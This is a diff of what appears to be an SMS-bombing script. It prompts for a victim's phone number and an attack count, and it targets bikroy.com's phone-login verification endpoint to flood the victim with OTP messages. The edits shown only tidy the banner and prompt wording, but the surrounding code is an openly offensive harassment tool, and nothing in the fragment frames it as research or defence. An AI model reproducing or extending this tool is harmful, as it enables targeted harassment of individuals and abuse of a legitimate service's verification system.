@@ -77,7 +77,7 @@ print(bigreen+"""\t
              █░█░█░█░█░█░█░█░█
              █░█░█░█░█░█░█░█░█
              █░█░█░█░█░█░█░█░█                
-             █     Vincenzo  █               
+             █    Vincenzo   █               
              █░█░█░█░█░█░█░█░█
              █░█░█░█░█░█░█░█░█""")
 
@@ -101,10 +101,10 @@ print ("""
 
 import requests
 from requests.structures import CaseInsensitiveDict
-number  = str(input("[>] Hello Sir Provide Your Victim Num: "))
+number  = str(input("[>] Provide Your Victim Num: "))
 
 
-amount = int(input("[>] Hello Sir Provide Attack Amount: "))
+amount = int(input("[>] Provide Attack Amount: "))
 
 url0 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number+""
 
